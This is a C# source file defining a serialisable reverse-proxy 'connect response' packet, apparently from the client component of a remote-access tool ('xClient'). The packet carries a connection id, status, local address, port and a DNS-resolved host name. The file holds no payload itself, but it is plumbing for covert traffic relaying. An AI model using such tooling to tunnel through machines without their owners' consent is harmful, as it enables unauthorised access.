using System;
using System.Net;
using xClient.Core.Networking;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [Serializable]
    public class ReverseProxyConnectResponse : IPacket
    {
        public int ConnectionId { get; set; }

        public bool IsConnected { get; set; }

        IPAddress LocalAddress { get; set; }

        public int LocalPort { get; set; }

        public string HostName { get; set; }

        public ReverseProxyConnectResponse(int connectionId, bool isConnected, IPAddress localAddress, int localPort, string targetServer)
        {
            this.ConnectionId = connectionId;
            this.IsConnected = isConnected;
            this.LocalAddress = localAddress;
            this.LocalPort = localPort;
            this.HostName = "";

            if (isConnected)
            {
                try
                {
                    //resolve the HostName of the Server
                    System.Net.IPHostEntry entry = System.Net.Dns.GetHostEntry(targetServer);
                    if (entry != null && !String.IsNullOrEmpty(entry.HostName))
                    {
                        HostName = entry.HostName;
                    }
                }
                catch { HostName = ""; }
            }
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
